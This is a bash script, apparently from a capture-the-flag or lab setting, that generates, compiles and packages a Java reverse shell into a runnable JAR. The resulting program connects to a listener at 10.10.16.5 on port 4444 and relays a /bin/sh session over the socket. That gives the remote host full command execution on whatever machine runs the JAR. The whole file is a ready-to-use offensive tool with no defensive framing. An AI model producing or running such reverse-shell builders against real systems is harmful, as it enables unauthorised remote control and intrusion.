#!/bin/bash
NAME=Shell
LHOST=10.10.16.5
LPORT=4444
COMMAND=/bin/sh

CURDIR=$(pwd)
BUILDDIR=$(mktemp -d)
cd "${BUILDDIR}"

cat > "${NAME}.java" << EOF
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
public class ${NAME} {
  public static void main(String[] args) throws Exception {
    String host = "${LHOST}";
    int port = ${LPORT};
    String cmd = "${COMMAND}";
    Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s = new Socket(host,port);
    InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
    OutputStream po = p.getOutputStream(), so = s.getOutputStream();
    while(!s.isClosed()) {
      while(pi.available()>0)
        so.write(pi.read());
      while(pe.available()>0)
        so.write(pe.read());
      while(si.available()>0)
        po.write(si.read());
      so.flush();
      po.flush();
      Thread.sleep(50);
      try {
        p.exitValue();
        break;
      }
      catch (Exception e){
      }
    };
    p.destroy();
    s.close();
  }
}
EOF
cat "${NAME}.java"
mkdir META-INF
echo "Main-Class: ${NAME}" > META-INF/MANIFEST.MF
javac --release 7 -d . "${NAME}".java
jar cmvf META-INF/MANIFEST.MF shell.jar "${NAME}".class
mv shell.jar ${CURDIR}/shell_$(date '+%s').jar
cd ${CURDIR}
rm -rf "${BUILDDIR}"
